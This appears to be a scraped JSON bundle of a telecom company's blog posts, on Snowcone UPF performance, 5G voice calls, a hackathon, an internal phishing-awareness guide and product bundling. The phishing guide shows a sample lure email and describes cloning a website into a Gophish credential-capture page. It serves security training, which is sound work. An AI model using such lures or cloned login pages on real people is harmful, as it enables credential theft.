10px\\"\\n}}\\nsrc={require(\\"!file-loader!./userland-speedtest.png\\").default}\\n/>\\n\\nLooking at htop again, we can see that now both CPU cores are pegged at 100% since the UPF is actually multithreaded. \\nSo even if the EC2 instance in Snowcone can push about 6 Gbit/s on iperf3, with the additional overhead of \\nGTP encapsulation and de-encapsulation, it can only do about 180 Mbit/s.\\n\\nWe know that our userland UPF will be able to push around 500 Mbit/s on other machines, so this is a clear limitation \\nof the Snowcone.\\n\\nWith the DPDK based UPF however we are able to have higher throughput. DPDK will take control over the DNI and use \\na poll-mode driver for packet processing. So one CPU core will always be pinned at 100% and the NIC will \\ndisappear from the instance.\\n\\n<img\\nwidth=\\"50%\\"\\nalign=\\"middle\\"\\nstyle={{\\ndisplay: \\"block\\",\\nmargin:\\"auto 10px\\"\\n}}\\nsrc={require(\\"!file-loader!./vpp-speedtest.png\\").default}\\n/>\\n\\nThis is actually the maximum speed we can get out of our gNodeB. So we are pretty happy with the result.\\n\\nWe hope you liked this short look at the AWS Snowcone, and we will for sure explore the Snowcone further. It\'s a \\nnice little device that will be especially useful for smaller deployments or PoCs of our Packet Core as it can be easily \\nremote-managed and transported everywhere.\\n\\n## Update\\nSince the original Blog Post about Snowcone we were able to debug the problem with the DNI detach process further \\nand with help from AWS were able to resolve it. The fix for this should be released with an updated version of \\nAmazon Linux in the future according to AWS."},{"id":"first-voice-calls-on-5g","metadata":{"permalink":"/blog/first-voice-calls-on-5g","editUrl":"https://github.com/working-group-two/wgtwo.com/edit/main/blog/../blog/2022-11-16-vonr/index.md","source":"@site/../blog/2022-11-16-vonr/index.md","title":"We have just completed our first VoNR (5G) calls in a multi-handset environment","description":"If that headline was slightly incomprehensible to you, it means that we\u2019ve now made it possible to call pretty much anyone from a 5G-enabled handset that is connected to the Working Group Two 5G core via a 5G antenna. To be clear, we\u2019re not talking about making a \u201cfirst\u201d Voice over New Radio (VoNR) call (those took place way back in 2021), but about making VoNR calls from a set of major commercial off-the-shelf (COTS) 5G devices to other mobile and fixed handsets.","date":"2022-11-17T00:00:00.000Z","formattedDate":"November 17, 2022","tags":[{"label":"vonr","permalink":"/blog/tags/vonr"},{"label":"5G","permalink":"/blog/tags/5-g"},{"label":"4G","permalink":"/blog/tags/4-g"},{"label":"core","permalink":"/blog/tags/core"},{"label":"IMS","permalink":"/blog/tags/ims"},{"label":"volte","permalink":"/blog/tags/volte"}],"readingTime":4.715,"hasTruncateMarker":true,"authors":[{"name":"Yan Grunenberger","title":"Software Engineer for Session Management & Protocol Termination","url":"https://www.linkedin.com/in/yangrunenberger/","imageURL":"/img/author-photos/yg.jpg","key":"yan"},{"name":"D\u017eiugas Baltr\u016bnas","title":"Software Engineer","url":"https://www.linkedin.com/in/dziugas/","imageURL":"/img/author-photos/db.jpeg","key":"db"}],"frontMatter":{"slug":"first-voice-calls-on-5g","title":"We have just completed our first VoNR (5G) calls in a multi-handset environment","date":"2022-11-17T00:00:00.000Z","tags":["vonr","5G","4G","core","IMS","volte"],"authors":["yan","db"]},"prevItem":{"title":"Unboxing the AWS Snowcone and using it as a local UPF","permalink":"/blog/exploring-aws-snowcone"},"nextItem":{"title":"Here\'s what happened at Hackoween \ud83c\udf83","permalink":"/blog/hackoween-october-2022"}},"content":"import ImgWithCaption from \'../components/imgWithCaption\'\\n\\nIf that headline was slightly incomprehensible to you, it means that we\u2019ve now made it possible to call pretty much anyone from a 5G-enabled handset that is connected to the Working Group Two 5G core via a 5G antenna. To be clear, we\u2019re not talking about making a \u201cfirst\u201d Voice over New Radio (VoNR) call (those took place way back in 2021), but about making VoNR calls from a set of major commercial off-the-shelf (COTS) 5G devices to other mobile and fixed handsets. \\n\\n\x3c!--truncate--\x3e\\n\\nAs we see it, voice continues to be relevant across \u201cGs\u201d, usage areas, and handset types. This year, we\u2019ve continued to rapidly adapt our voice stack to emerging needs. This included enabling it for 5G Standalone (SA; also called New Radio, or NR). We\u2019re doing this because we see strong effects of taking a platform approach, where adding something like VoNR becomes a relatively straightforward exercise. \\n\\nLet\u2019s put some emphasis on \u201crelatively\u201d because there are some thoughtful considerations to be made and some steps to be taken. In a pure 5G world, you\u2019ll have a fancy new radio with high bandwidth, low latency, and the opportunity to create little (or big) slices for various use cases. In addition to the radio, you\u2019ll have a new 5G SA core where all this beauty is enabled and managed. \\n\\nThe situation right now is that even if you have a \u201c5G\u201d logo on the top of your handset, you are - in most commercial 5G networks - actually calling via 4G. This means that your handset needs to connect to a 4G core and an IP Multimedia Subsystem (IMS) core to act as the intermediary between you and the person you want to talk to. 4G radio network coverage is significantly better in most parts of the world and pretty much all handsets out there support that \u201cG\u201d. \\n\\nWhat we want is to enable a pure 5G play, that is, a 5G handset making 5G calls using exclusively a 5G stack all the way. This reduces complexity, improves reliability of calls by avoiding radio access technology changes, and enables effective use of network and handset resources (control plane and airtime). This is especially valuable in a private network or other greenfield environments. Most brownfield deployments have been designed to basically use the current network technology to support voice usage. \\n\\n> For example, during early 4G deployments, 3G voice was used, delaying the actual deployment of VoLTE (4G) technology. Similarly, 5G Non-Standalone (NSA) is still using a 4G anchor to support voice calls. In a pure, greenfield deployment, such as with CBRS or sXGP spectrum types, where customers will most likely deploy a single G (either 4G for cost/maturity driven reasons, or 5G for bandwidth per cell or future-proof reasons), voice will need to be supported from day one. \\n\\n## Here\u2019s what we did\\n\\n **1.** We first got a hold of a set of COTS handsets featuring the major mobile handset chipsets in the market, from the likes of MediaTek, Samsung, Qualcomm and Huawei.\\n \\n **2.** Then we connected our cloud-based IMS core to our 5G SA core. \\n \\n **3.** We connected our core to a commercial 5G antenna in our lab. The 5G antenna was procured from one of the major mobile network vendors. Interestingly, it didn\u2019t support VoNR out of the box, so we had to enable that setting. \\n \\n **4.** We then started testing the handsets (and their chipsets). We observed that they have different levels of maturity in their stacks. For example, we discovered that some handsets were unstable if they did not have access to the IMS core. \\n \\n > A further explanation on that: a user equipment (UE), according to the 3GPP specs,  has a voice or data-centric setting they employ when registering on the network. For an UE with a voice-centric function, like handsets, most of them will try to connect to an IMS core. If a PDU session establishment request is not honored by the core, the handset will disconnect and reconnect, creating some fluctuations on the data connection. The only way to ensure those handsets got a proper data connection was to secure a connection to the IMS core. \\n \\n **5.** Ultimately, we were able to establish voice calls in all directions - to 5G, 4G handsets (VoLTE), VoWifi and so on. \\n \\n## Let\'s dig a little deeper\\n5G handsets place voice calls by initiating a connection to the 5G network\u2019s IMS core. Handsets would disconnect or underperform if they couldn\u2019t establish that connection. The 5G core needs to implement an establishment and release of dedicated Quality of Service (QoS) flows. These flows tell the UE and antenna how to prioritize IP packets carrying call audio over other mobile data traffic. \\n\\nMore specifically, a QoS flow is associated with standardized 5G QoS identifiers (5QI) that among other things define packet error rate and delay budget, and whether IP packets associated with the flow get a guaranteed bit rate. Only when a dedicated QoS flow for voice is established, the scheduler of the antenna as well as the rest of the involved 5G core elements have all the ingredients to prioritize a phone call over, say, a Netflix session in the background. \\n\\nThe COTS handsets we tested behaved differently in how they handled the establishment of an IMS connection and QoS flow. That leads us to conclude that even in the 5G SA networks there are still some major interoperability challenges, including on the antenna side, which might be configured for data primarily, not voice. \\n\\nNevertheless, 5G SA has reached a state where its technology can be procured and used with handsets available in the market."},{"id":"hackoween-october-2022","metadata":{"permalink":"/blog/hackoween-october-2022","editUrl":"https://github.com/working-group-two/wgtwo.com/edit/main/blog/../blog/2022-10-31-hackoween/index.md","source":"@site/../blog/2022-10-31-hackoween/index.md","title":"Here\'s what happened at Hackoween \ud83c\udf83","description":"Just as October was about to close, we ran a hackathon, aptly named \\"Hackoween\\" \ud83c\udf83","date":"2022-11-03T00:00:00.000Z","formattedDate":"November 3, 2022","tags":[{"label":"hackathon","permalink":"/blog/tags/hackathon"}],"readingTime":2.32,"hasTruncateMarker":true,"authors":[{"name":"Everyone @ wgtwo","title":"\ud83c\udf55","url":"https://www.wgtwo.com","imageURL":"/img/author-photos/wgtwo.png","key":"wgtwo"}],"frontMatter":{"slug":"hackoween-october-2022","title":"Here\'s what happened at Hackoween \ud83c\udf83","date":"2022-11-03T00:00:00.000Z","tags":["hackathon"],"authors":"wgtwo","image":"./Hackoween.png"},"prevItem":{"title":"We have just completed our first VoNR (5G) calls in a multi-handset environment","permalink":"/blog/first-voice-calls-on-5g"},"nextItem":{"title":"Our guide to internal phishing campaigns","permalink":"/blog/internal-email-phishing-campaigns"}},"content":"import ImgWithCaption from \'../components/imgWithCaption\'\\n\\nJust as October was about to close, we ran a hackathon, aptly named \\"Hackoween\\" \ud83c\udf83\\n\\nHackdays are a great way for everyone in the company to work together in creating new innovative solutions for everyday problems.\\n\\n![Hackoween](./Hackoween.png)\\n\\n\x3c!--truncate--\x3e\\n\\nThis time, we had the joy of having a hackday that included 15+ teams and yes - *pizza*. As with anything these days, a hackathon is a mix of virtual and physical. \\n\\n# Hackday Presentations\\n\\n## Building a system overview for wgtwo\\n\\n*Team: Karl Johan, Anders, Tor, Oliver, Tobias*\\n\\nBuilding a new \\"Telco 102\\" visualization of our system architecture - used for both internal onboarding and to aid us when we talk to customers. \\n\\n## MATRIX (MAximum TRacing with mInimal Xffort)\\n\\n*Team: Karl Johan*\\n\\nSide-project to see what we could get out of our Java/Kotlin services by utilizing existing projects. Utilize the setup the Infrastructure team has made in dev around opentelemetry and XRay. The idea is to improve tracing across the stack. \\n\\n## Gophish - for internal anti-phishing campaign\\n\\n*Team: Jonny, Gunnar Inge*\\n\\nThe goal of this project is to deploy Gophish and setup a phishing campaign - to develop internal resilience against phishing attacks. Check out their guide to developing internal phishing campaigns [on our blog.](https://www.wgtwo.com/blog/internal-email-phishing-campaigns/)\\n\\n## Walicy - (wasm policy resolving)\\n\\n*Team: Noy, Bj\xf8rn N*\\n\\nWrite a library / sidecar to use wasm to implement policy resolving.\\n\\n## VoWiFi\\n\\n*Team: Konstantin, Yan, Anton, Fabricio*\\n\\nTo build a more cloud-native ePDG to enable Voice-over-WiFi. \\n\\n## Handover Machine 2000 (Hammer2000)\\n\\n*Team: Holger, Sindre, Rune, Alain, Jacob*\\n\\nFor testing handover between two physical antennas a phone needs to move between the coverage of two antennas. This has historically been done by moving a human holding a phone between two antennas. We attenuenated the radio signal with a rotating BLANDA BLANK serving bowl from Ikea - remotely controlled, of course! \\n\\nIn a bright future, we want a physical contraption that will move a phone between the coverage areas of the antennas. \\n\\n![The Hammer 2000](./hammer2000.jpg)\\n\\n## Cloud PBX - call center\\n\\n*Team: Sergey*\\n\\nWTP and WebRTC-based minimalist PBX (with no SIP). \\n\\n## Explore Vite+Bazel(+Javalin/VuePress) for instant development feedback\\n\\n*Team: J\xf8rund, Tibor*\\n\\nSeeking a smoother developer experience. The goal: instant changes (without reloading the page). \\n\\n## Easier voice deploys\\n\\n*Team: Atanas* \\n\\nEven more flexibility in deploying voice infrastructure through IP-operator magic. \\n\\n## Improve visibility of the subscriber activity in our network\\n\\n*Team: Tech support team, Nicholas, Pavel, Fabricio*\\n\\nDashboard showing subscriber activity and be able to drill down and filter the activity in a variety of ways. \\n\\n## Hackoween for beginners\\n\\n*Team: Theresa, Oda*\\n\\nWhat two non-hackers can achieve in three days (building an onboarding website).\\n\\n## Kubernetes service canary (ish)\\n\\n*Team: Didier*\\n\\nPOC of scripts to add/remove a canary pod to k8s services dynamically."},{"id":"internal-email-phishing-campaigns","metadata":{"permalink":"/blog/internal-email-phishing-campaigns","editUrl":"https://github.com/working-group-two/wgtwo.com/edit/main/blog/../blog/2022-10-22-phishing/index.md","source":"@site/../blog/2022-10-22-phishing/index.md","title":"Our guide to internal phishing campaigns","description":"From:  HR of WG2","date":"2022-10-22T00:00:00.000Z","formattedDate":"October 22, 2022","tags":[{"label":"security","permalink":"/blog/tags/security"}],"readingTime":11.735,"hasTruncateMarker":true,"authors":[{"name":"Jonny Griffin","title":"Security Tech Lead","url":"https://www.linkedin.com/in/jonnathangriffin/","imageURL":"/img/author-photos/jg.jpg","key":"jonny-griffin"}],"frontMatter":{"slug":"internal-email-phishing-campaigns","title":"Our guide to internal phishing campaigns","tags":["security"],"authors":["jonny-griffin"]},"prevItem":{"title":"Here\'s what happened at Hackoween \ud83c\udf83","permalink":"/blog/hackoween-october-2022"},"nextItem":{"title":"How product bundling simplifies the distribution challenge","permalink":"/blog/how-product-bundling-simplifies-distribution"}},"content":"import Image from \\"@theme/IdealImage\\";\\nimport styles from \\"./styles.css\\";\\nimport Tooltip from \'../components/tooltip/tooltip\'\\n\\n<div class=\\"email\\">\\n\\nFrom:  **HR of WG2** <w272r84d4q @gmail.com>   \\nTo: Your Name yourname@wgtwo.com  \\nSubject: Action required now for holiday party  \\nDate: Oct 21, 2022, 6:29 PM  \\n<hr />\\n\\nHi! \\n\\nWorking Group 2 is celebrating the holidays. To do so we need all WGTWO employees to sign up if they would like to receive a FREE gift. We have a limited number so need to here from you quickly. The wgtwo HR needs to know your answer by the end of this week so please signup on the link immediately <a href =\\"\\">HERE</a>.  \\n\\nThanks for your participation and patience. HR and CEO of WG2\\n</div>\\n\\n\x3c!--truncate--\x3e\\n\\n![mr-bean-phishing-meme](mr-bean-phishing-meme.jpeg)\\n\\nHi! You either came here because a **wgtwo** internal phishing campaign phished you or you are interested in learning more about phishing! For whatever reason, welcome and we hope this blog post is useful for learning one or two things about this systematic problem - phishing. \\n\\n\\n\\n## Phishing and Social Engineering\\nSocial engineering is a technique used to trick people into believing something untrue. For example, if one is pretending to be a janitor and walking past the security guard, or if one is tricking someone online to believe you are the CEO of their company. \\n\\nOver the internet, one can trick or phish people most commonly on social media, SMS, voice calls, websites, and email. Some of these phishing techniques are so popular that they receive specific names. For example, vishing relates to voice calls, and smishing relates to SMS. While these are very much relevant for **wgtwo** as we operate a mobile core network, today we will focus on the social engineering attack that is prominent via email called phishing. Furthermore, we will focus on how can we identify phishing emails, protect ourselves from phishing attacks, and provide insight into how a company could protect its employees by sharing our experiences. \\n### Example phishing email\\n\x3c!-- [image]() of a phishing email --\x3e\\n\\n<div class=\\"email\\">\\n\\nFrom:  **HR of WG2** <Tooltip text=\\"w272r84d4q@gmail.com\\" subtext=\\"The sender is not from a wgtwo.com email\\" />  \\nTo: Your Name yourname@wgtwo.com  \\nSubject: <Tooltip text=\\"Action required now\\" subtext=\\"Sense of urgency to trick you\\" /> for holiday party  \\nDate: Oct 21, 2022, 6:29 PM  \\n<hr />\\n\\nHi! \\n\\n<Tooltip text=\\"Working Group 2\\" subtext=\\"Mispelling of the company name\\" /> is celebrating the holidays. To do so we need all <Tooltip text=\\"WGTWO\\" subtext=\\"Mispelling of the company name\\" /> employees to sign up if they would like to receive a <Tooltip text=\\"FREE\\" subtext=\\"nothing in life is for free ;)\\" /> gift. We have a limited number so need to here from you <Tooltip text=\\"quickly\\" subtext=\\"Sense of urgency to trick you\\" />. The wgtwo HR needs to know your answer by the <Tooltip text=\\"end of this week\\" subtext=\\"Sense of urgency to trick you\\" /> so please signup on the link <Tooltip text=\\"immediately\\" subtext=\\"Sense of urgency to trick you\\" /> <a href =\\"\\">HERE</a>.  \\n<br />\\n<br />\\nThanks for your participation and patience. HR and <Tooltip text=\\"CEO\\" subtext=\\"Using authority to drive action\\" /> of <Tooltip text=\\"WG2\\" subtext=\\"Mispelling of the company name\\" />\\n</div>\\n\\n### Common characteristics to phishing emails\\n- Email sender name is spoofed\\n- Misspellings\\n- Specific tasks that are abnormal\\n- Poorly formatted emails with weird or inconsistent fonts\\n- An attachment with a strange extension (as this is a mechanism for hiding from malware scanners)\\n- Urgency\\n- Using names of authority\\n\\n## Why phishing\\n\\n:::caution phishing\\n### 20% of all data breaches are caused by phishing\\n###### Report from [2022 Verizon data breach report](https://www.verizon.com/business/resources/reports/dbir/2022/summary-of-findings/) \\n:::\\n\\n\\nSocial engineering is an efficient way of stealing personal information and compromising internet resources making it such an effective way for \u201chacking\u201d companies. \\n\\nFrom the perspective of a malicious actor, why would they try to exploit a vulnerability in a single system when they can just phish an employee into sharing their credentials who already have access to several systems?\\n> ## Effective, easy, and free\\n\\nToday anyone can set up a new email account and begin sending emails from a verified, reputable email server - FOR FREE!\\n\\nIn addition, several websites configured with email authentication can be stolen and leveraged to send phishing malware from compromised devices and portals. \\n\\n## Phishing attacks\\nGenerally, when people mention phishing, we are talking about email phishing. However, we have other types.\\n\\n:::caution phishing\\n## Types of phishing attacks\\n- **Email Phishing**: sent via email\\n- **Spear phishing**: sent via email and targeted attack towards a company or set of people\\n- **Smishing**: sent via SMS\\n- **Vishing**: sent via voicecalls \\n:::\\n### Spear phishing \\nSpear phishing is a social engineering attack that targets a specific entity, company, or person. Generally speaking, these are targeted phishing attacks as they will alter the message to make it more relevant for the victim. For example, in a spear phishing email, the malicious actor would use the company logo, and other employee names within the company, leverage the company CSS and UI, and/or purchase a domain that resembles the target\u2019s entity in all efforts for tricking the victim into sharing personal information such as login credentials.\\n\\nNotably, in recent years there have been newsworthy events where spear phishing attempts have been successful in compromising companies. \\n\\nOn [Sep 16, 2022, Uber experienced a social engineering attack](https://www.uber.com/newsroom/security-update/) that allowed the malicious actor to gain access to internal resources such as Slack, HackerOne, and several internal systems including a finance portal. This is an excellent example of how a group of hackers targeted an enterprise to compromise an employee\'s credentials to gain access to not just one system but several. Briefly mentioned in this report, Uber said that they are revising the MFA internal policies. This is a key control for preventing unauthorized access - which **wgtwo** continually implements and monitor across all applications.\\n\\nSearch engines are leveraged for easy data mining of company information that can be used in spear phishing attacks. \\n\\nOne open-source tool that leverages search engines for information gathering of company data such as emails is baked into Kali Linux but also found on GitHub called [theHarvester](https://github.com/laramies/theHarvester). I can recommend checking it out!\\n\\n### Smishing \\nAs discussed previously, smishing is a social engineering attack that is leveraging the SMS protocol for sending a malicious payload to the victim. \\n\\nSmishing is a very effective attack as the sms open rate is about 99%. With such a high open rate, it is almost certain that the SMS will be viewed by the victim if not blocked by the device or operator.\\n\\nAs **wgtwo** operates a mobile core network, one goal of ours is to protect the health of the SS7 network and the hygiene of SMS traffic. Ultimately, this led to us building an internal mechanism for identifying SMS spam. From this internal solution we identified that via malicious apps installed on a mobile device, smishing messages were propagated via that malicious app behind the scenes using the mobile device\u2019s modem - unidentified by the end user. Essentially, leveraging the victim\'s device to re-propagate the phishing malware. Again, very similar to what we see in email phishing with a victim\'s email server or website getting compromised and then propagating phishing malware from this infected endpoint.\\n## Protect yourself\\nAs much as email providers and clients try to prevent phishing messages from ending in your email inbox, it is bound that everyone will eventually receive a phishing message. Thus, it is up to us to ultimately stay protected from these social engineering attacks. Here are a few best practices to help you stay secure:\\n\\n- Never share personal information such as your email address, password, or one-time-passcodes (OTPs)\\n- Don\u2019t trust email. Anyone can send you an email.\\n- Learn the effective ways of detecting phishing emails like reviewing the sender address, misspellings in the email, and incorrect information - as mentioned previously in this blog post\\n- Keep your software up-to-date to help protect from vulnerabilities being exploited. This includes your web browser and operating system.\\n- If the phishing email is sent from the CEO of the company, for example - reach out to the CEO in another communication channel like slack or SMS to confirm the email is authentic\\n- Ask for help from colleagues, friends, or family if in doubt about an email\\n\\n## Protect your company\\n### 2FA\\nEnabling 2FA today is a necessary step for the security of employee accounts and access. Take the scenario of an employee being phished and sending their login credentials to a malicious actor - well they don\'t have the one-time passcode that\'s generated on new unknown logins. Ultimately this mitigates the risk completely as the actor was unable to log in. Today we are seeing new solutions from apple and others that are building passwordless solutions. [Apple Passkeys](https://developer.apple.com/passkeys/) is an interesting solution as this leverages biometrics and your device to make an easy and secure way for authenticating.\\n### SPF DKIM and DMARC\\nAn organization is responsible for properly configuring and managing email security. Many if not all email providers allow the configuration of email authentication to prevent the unauthorized sending of emails from your company\'s domain. \\n- **SPF**: Specifies the servers and domains that are authorized to send emails on behalf of your organization.\\n- **DKIM**: Adds a digital signature to every outgoing message, which lets receiving servers verify the message came from your organization.\\n- **DMARC**: Let you tell receiving servers what to do with outgoing messages from your organization that doesn\u2019t pass SPF or DKIM.\\nBy adopting the above email authentication protocols one can create an allowlist for where they expect internal email to be originating from and a policy that tells what to do with an email that does not meet the authentication standard. This helps prevent spoofing and phishing emails originating and delivered to your employees \\n### Internal phishing campaigns\\nWe are an advocate of security through education. What might be common sense for someone is not for another. Learning is an interesting topic in itself but in reality, until one has spent the time to create an understanding or learn from an experience or event one might truly understand. However with phishing, one might know what it is and not say to click the link, but they still do that. Why might you ask? Well, we are all human and bound to make mistakes.\\n\\nOur belief is internal phishing campaigns can be used as an educational exercise but should only be viewed as an educational tool - rather than - a way to purposely trick employees into \u201cfailing\u201d an exercise. View the next section to learn more about how **wgtwo** approaches and build its internal phishing campaigns.\\n## How **wgtwo** performs internal phishing campaigns\\nAs industry best practices recommend companies perform security awareness training continually and the growing security threat of phishing leads **wgtwo** to build the capability and perform internal phishing campaigns. For an effective phishing campaign we have a few guidelines we follow:\\n\\n**Dos**\\n- Always inform employees before a phishing campaign via slack #security channel\\n- Make the phishing campaign educational\\n\\n**Don\u2019ts**\\n- Never blame an employee for clicking the link and falling a victim to the phishing campaign\\n\\nIn October 2022, during a **wgtwo** hack day, we decided to build some new automation for conducting an internal phishing campaign.\\n### Architecture for internal phishing campaigns\\n#### Tools\\n\\n[Gophish](https://github.com/gophish/gophish) is an open-source phishing toolkit designed for businesses and penetration testers. It provides the ability to quickly and easily set up and execute phishing engagements and security awareness training.\\n\\n![Gophish](gophish-campaign.svg)\\n\\nGophish is helpful for us because it has an API to help automate the process, with some cool features to track the delivery of emails and record who clicked the link for example. \\n\\nAs part of our process of adopting Gophish we contributed back upstream   \\n- Build and publish to ghcr.io on merge https://github.com/gophish/gophish/pull/2644\\n\\n#### Procedure\\nFor every internal phishing campaign we take the following steps:\\n\\n1. Send a notification in the #security slack channel that a new phishing campaign has been created for some time in the future\\n2. Fetch a recent list of employee names/email addresses from google admin via an API call\\n3. Upload to the Gophish server as a new email campaign via an API call\\n4. Create a new email and make it relevant for the time of year, recent events, etc. and as the payload, including the link to this blog post as security awareness training\\n\\n### Example phishing campaign email\\nCan you spot the errors in this spear phishing campaign?\\n\\n#### Gophish Campaign Landpage \\nIn Gophish we are able to \\"steal\\" the html/css of existing website sites to build our own landing page. The landing page purpose is the payload that is imbeded in the email to capture sensitive data like username and password.\\n\\n![gophish landingpage](gophish-landingpage.png) \\n\\n\\n\\n#### Spear Phishing Email and Landing Page\\n![email payload](gophish-landingpage-hq.png) \\n\\n**Email**\\n- always check the sender\\n- longer pressing on the link will popup a preview where you can see the true URL\\n- my name was in the email but this because it was a spear phishing - and still can\'t be trusted\\n- the source name said it was `Oda` but after inspecting the email it was actually from an outlook.com account\\n\\n**Website**\\n- always check the URL to ensure it is from the trusted source\\n- leverage password managers as because the URL is not the true source, the password manager would not share the credentials\\n- install adblockers on your phone or computer and blocks adds\\n\\n> Note: On iOS a lot of information is hidden from the user, but there are still tricks to identify the true source and metadata about the email and payload.\\n\\n- longer pressing on the link will popup a preview where you can see the true URL\\n- my name was in the email but this because it was a spear phishing - and still can\'t be trusted\\n- the source name said it was `Oda` but after inspecting the email it was actually from an outlook.com account\\n\\n![email payload](email-payload.png)"},{"id":"how-product-bundling-simplifies-distribution","metadata":{"permalink":"/blog/how-product-bundling-simplifies-distribution","editUrl":"https://github.com/working-group-two/wgtwo.com/edit/main/blog/../blog/2022-10-13-product-bundling/index.md","source":"@site/../blog/2022-10-13-product-bundling/index.md","title":"How product bundling simplifies the distribution challenge","description":"Our big belief is that the telecom industry should start building global platforms with the aim of achieving network effects - like many of the adjacent industries in devices and apps. To enable this, we\u2019re building a mobile core from the ground up, running it in the public cloud and offering it as-a-service globally. To make it even harder (and fun) for ourselves, we\u2019re also developing a full, API-based global product ecosystem to give telecom operators new revenue and differentiation opportunities.","date":"2022-10-13T00:00:00.000Z","formattedDate":"October 13, 2022","tags":[{"label":"saas","permalink":"/blog/tags/saas"},{"label":"operators","permalink":"/blog/tags/operators"},{"label":"bundling","permalink":"/blog/tags/bundling"},{"label":"products","permalink":"/blog/tags/products"},{"label":"distribution","permalink":"/blog/tags/distribution"},{"label":"ecosystem","permalink":"/blog/tags/ecosystem"}],"readingTime":5.325,"hasTruncateMarker":true,"authors":[{"name":"Odd Trondrud","title":"Developer","imageURL":"/img/author-photos/ot.jpg","key":"odd-trondrud"}],"frontMatter":{"slug":"how-product-bundling-simplifies-distribution","title":"How product bundling simplifies the distribution challenge","date":"2022-10-13T00:00:00.000Z","tags":["saas","operators","bundling","products","distribution","ecosystem"],"authors":["odd-trondrud"],"image":"./peoplebundle.jpg"},"prevItem":{"title":"Our guide to internal phishing campaigns","permalink":"/blog/internal-email-phishing-campaigns"},"nextItem":{"title":"Atos and Working Group Two to deliver core-as-a-service to mobile operators worldwide","permalink":"/blog/atos-teams-with-wgtwo"}},"content":"import ImgWithCaption from \'../components/imgWithCaption\'\\n\\nOur big belief is that the telecom industry should start building global platforms with the aim of achieving network effects - like many of the adjacent industries in devices and apps. To enable this, we\u2019re building a mobile core from the ground up, running it in the public cloud and offering it as-a-service globally. To make it even harder (and fun) for ourselves, we\u2019re also developing a full, API-based global product ecosystem to give telecom operators new revenue and differentiation opportunities. \\n\\nOne of the questions we get from operators is how to distribute products to their subscribers. There are multiple ways to go about it, but in this post, we\'ll show how an operator can enable products for their subscribers in what we call bundling.\\n\\n\x3c!--truncate--\x3e\\n\\n### Part one: What is bundling?\\n\\nBundling. What is bundling? Probably something like \u201cto group together and sell for one price.\\" Why would you want to group something together in a bundle? How do you bundle something abstract like a \u201cproduct\u201d, and what would you even bundle that together with? These are all good questions.\\n\\nMost people are probably familiar with the concept of \\"pre-installed applications,\\" like how your smartphone comes out of the box with software to handle SMS and MMS messages, or a web browser that might not be the one you personally prefer. You could think of this as a type of bundling - including a product or service within another product. At Working Group Two we do not make phones or applications that run on phones. We are creating an ecosystem for products that run on top of or adjacent to mobile subscriptions by using our mobile core platform (which is also a thing we are doing, as we mentioned earlier).\\n\\n### Part two: How does our bundling work? \\n\\n\u201cNow hold on,\u201d you might think, \u201cwhat\u2019s this got to do with... whatever it is you\u2019re trying to accomplish as a company?\u201d Well, here at Working Group Two we strongly believe that there is a lot of value in talking to and listening to our customers and users. One of the subjects we\u2019ve discussed at length with some of our customers is how to distribute products from the operator to their subscribers. \\n\\nSo far we\u2019ve identified three different approaches to this:\\n\\n- **1. Single**: A single subscriber gets the product, by personally activating it for their subscription. The subscriber would need to find and activate the product via some interface like an \u201capp store\u201d or marketplace. \\n- **2. Everyone**: The entirety of the subscriber base gets the product. \\n- **3. Bundling**: A subset of the subscribers gets the product, by including it into one or several plans or offerings provided by the operator.\\n\\nSome products might seem like ideal candidates for distribution through a marketplace (option 1). A product which automatically transcribes calls (into text) isn\u2019t something everyone needs, but there\u2019s definitely people who are willing to pay for such a thing. The marketplace approach introduces another distribution-related problem, however, that of distributing the knowledge of the marketplace and its contents. On the flip side, enabling a product for the entirety of the subscriber base (option 2) makes sense if said product is marketed as a core feature of the operator\u2019s subscriptions or if it\'s meant to take care of market-specific regulatory requirements.  \\n\\nOption 3 (bundling) solves the information-distribution problem of the marketplace approach by allowing the operator to market the bundled products as features of a certain subscription tier. \\n\\nHere are some examples:\\n\\n|  |  |\\n|---|---|---|\\n| **B2B mobile operators** | An operator might realize that not all of their potential customers need a full switchboard solution (known in telco language as a PBX), and decide to offer that as an \u201cadd-on\u201d or a bundled part of a higher-priced subscription package. |\\n|  | An operator could offer advanced speech-to-text solutions to lawyers, real estate agents, and translation companies to help them automate their workflows. |\\n| **B2C mobile operators** | An operator could bundle a web content filtering product along with a subscription package aimed at kids (or rather the parents of kids \u2013 who in some market segments have their own smartphones by the age of eight). |\\n|  | An operator could offer a subscription aimed towards groups of people most likely to become victims of malicious text message scams, including additional anti-scam measures. |\\n\\n\\nThe operators will be using an API where they manage their subscriptions. This is where they can activate new subscriptions, toggle high-speed data based on the users quota, and other operations.\\n\\nUsing the same API, they can send a list of which products should be bundled as part of these subscriptions. That is, the product they include in this list will be granted limited access allowing them to do their required interaction with the subscription. That may be everything from getting call information in real-time to receiving and forwarding SMSs.\\n\\nThese bundled products may be selected as part of the user\'s price plan, as e.g. enabling web filtering for kids for the subscriptions in the kids segment, or it can be additional products that the operators offer through their portal.\\n\\nThis concept of offering more tailored subscriptions to specific segments of the market is not new, but with the addition of products that leverage the Working Group Two ecosystem, the possibilities could go beyond most subscribers\u2019 current expectations of what a mobile subscription can offer.\\n\\n<ImgWithCaption\\n  style={{\\n    width: \\"50%\\",\\n    float: \\"right\\",\\n    marginLeft:\\"20px\\"\\n  }}\\n  caption=\\"The team is testing out bundling in the physical world\\"\\n  src={require(\\"!file-loader!./peoplebundle.jpg\\").default}\\n  />\\n\\nOperators using the Working Group Two mobile core can already select products from our product portfolio to bundle into their various price plans via our product marketplace. All it takes is a couple of mouse clicks. And yes, of course it can be integrated with their BSS (that\u2019s a Business Support System, for things like billing, order management, and revenue management). \\n\\n### Part three: Come hang out with us\\n\\nIf this sounds exciting to you as an operator, do not hesitate to [reach out.](https://www.wgtwo.com/contact/)\\n\\nPerhaps you\u2019re not an operator, but instead a developer of sorts already working within the mobile products space or just have an idea for a product within this space? You could check out our [Developer Portal](https://developer.wgtwo.com) and \\n[API documentation](https://v1.docs.wgtwo.com). You could also [reach out to us on Slack](https://developer.wgtwo.com/join-us-on-slack) if you have any questions."},{"id":"atos-teams-with-wgtwo","metadata":{"permalink":"/blog/atos-teams-with-wgtwo","editUrl":"https://github.com/working-group-two/wgtwo.com/edit/main/blog/../blog/2022-09-19-atos-teams-with-workinggroup-two/index.md","source":"@site/../blog/2022-09-19-atos-teams-with-workinggroup-two/index.md","title":"Atos and Working Group Two to deliver core-as-a-service to mobile operators worldwide","description":"Atos and Working Group Two (wgtwo) are teaming up to provide operators with a simplified, end-to-end mobile network solution. It is based on wgtwo\u2019s 4/5G 